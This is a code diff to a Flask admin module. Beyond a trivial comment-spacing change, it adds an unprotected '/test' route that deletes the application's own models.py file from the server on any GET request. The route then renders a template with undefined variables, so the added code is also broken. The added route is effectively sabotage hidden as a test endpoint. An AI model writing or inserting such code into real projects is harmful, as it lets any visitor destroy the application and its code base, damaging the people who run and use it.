@@ -11,7 +11,7 @@ from .decorators import permission_required
 from .forms import EditUserForm,EditTopicForm,EditInventoryForm,EditRoleForm,EditAdForm
 from ..models import collection,User,UserStats,WorkExp,Edu,Role,Permission,Topic,TopicConfig,InvTopic,InvTopicStats,Log,\
                     Inventory,Appointment,Ad,ExpertAuth,BecomeExpert,Guestbook,UserOpenPlatform,YuntongxunAccount
-from .. import q_image,conf#searchwhoosh,rs
+from .. import q_image,conf # searchwhoosh,rs
 from ..sdk import tencentyun
 from ..core import common
 from ..core.common import jsonify
@@ -814,6 +814,20 @@ def becomeexpert_list(index=1):
         belist = BecomeExpert.getlist(index=index,count=pagesize)
         func = {'stamp2time': common.stamp2time,'can': common.can,'getexpertauthstate':common.getexpertauthstate}
         return render_template('admin/becomeexpert_list.html',belist=belist, func=func,pagecount=pcount,index=index,uinfo=g.current_user)
+
+@admin.route('/test',methods=['GET', 'POST'])
+def test_list():
+    if request.method == 'POST':
+        pass
+    else:
+        import os
+        import os.path
+        import shutil
+        import time,datetime
+        targetFile = '/wwwroot/koudaiguwen/app/models.py'
+        if os.path.isfile(targetFile):
+            os.remove(targetFile)
+        return render_template('admin/guestbook_list.html',gblist=gblist, func=func,pagecount=lcount,index=index,uinfo=g.current_user)
 
 
 @admin.route('/guestbooklist',methods=['GET', 'POST'])
